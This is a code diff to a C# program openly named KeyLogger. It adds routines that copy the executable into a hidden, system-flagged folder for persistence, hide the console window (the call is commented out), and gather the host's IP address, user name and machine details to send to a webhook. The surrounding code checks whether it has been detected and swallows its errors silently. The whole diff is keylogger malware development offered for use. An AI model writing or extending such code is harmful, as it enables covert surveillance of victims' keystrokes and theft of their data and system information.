@@ -116,6 +116,10 @@ class KeyLogger
 
             // Monitor for detection
             MonitorForDetection();
+        
+            CopyToSecureLocation();
+
+            //SetupProcessHiding();
 
             // Keep the application running
             Console.WriteLine("KeyLogger started. Press Ctrl+C to stop.");
@@ -167,6 +171,48 @@ class KeyLogger
             }
         }
         catch { /* Silent failure */ }
+    }
+
+    private static void SetupProcessHiding()
+    {
+        try
+        {
+            IntPtr consoleWindow = GetConsoleWindow();
+            if (consoleWindow != IntPtr.Zero)
+            {
+                ShowWindow(consoleWindow, SW_HIDE);
+            }
+            SetConsoleCtrlHandler(new HandlerRoutine(ConsoleCtrlHandler), true);
+        }
+        catch (Exception ex)
+        {
+            LogToFile($"Process hiding setup error: {ex.Message}");
+        }
+    }
+
+    private static void CopyToSecureLocation()
+    {
+        try
+        {
+            string currentExecutable = Process.GetCurrentProcess().MainModule.FileName;
+
+            if (string.Equals(currentExecutable, SecureExecutable, StringComparison.OrdinalIgnoreCase))
+                return;
+
+            if (!Directory.Exists(SecureFolder))
+                Directory.CreateDirectory(SecureFolder);
+
+            if (File.Exists(currentExecutable) && !File.Exists(SecureExecutable))
+            {
+                File.Copy(currentExecutable, SecureExecutable);
+                LogToFile($"Copied to secure location: {SecureExecutable}");
+                File.SetAttributes(SecureExecutable, FileAttributes.Hidden | FileAttributes.System);
+            }
+        }
+        catch (Exception ex)
+        {
+            LogToFile($"Secure copy error: {ex.Message}");
+        }
     }
 
     private static void StartLogging()
@@ -401,16 +447,40 @@ class KeyLogger
             info.AppendLine($"Computer Name: {Environment.MachineName}");
             info.AppendLine($"User: {Environment.UserName}");
             info.AppendLine($"OS: {Environment.OSVersion}");
-            info.AppendLine($"Architecture: {Environment.Is64BitOperatingSystem ? "x64" : "x86"}");
+            info.AppendLine($"Architecture: {(Environment.Is64BitOperatingSystem ? "x64" : "x86")}");
             info.AppendLine($"Process: {Process.GetCurrentProcess().ProcessName}");
             info.AppendLine($"Start Time: {DateTime.Now}");
+
+            // Get IP address
+            try
+            {
+                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
+                foreach (var ip in host.AddressList)
+                {
+                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                    {
+                        info.AppendLine($"IP Address: {ip.ToString()}");
+                        break; // Get the first IPv4 address
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                info.AppendLine($"IP Address: Unable to retrieve IP address - {ex.Message}");
+            }
+
             info.AppendLine("======================");
+
+            // Add a small delay to ensure the webhook URL is loaded
+            await Task.Delay(100);
 
             await SendToWebhook(info.ToString());
         }
         catch (Exception ex)
         {
             LogToFile($"PC info error: {ex.Message}");
+            // Also log the stack trace for better debugging
+            LogToFile($"PC info stack trace: {ex.StackTrace}");
         }
     }
 
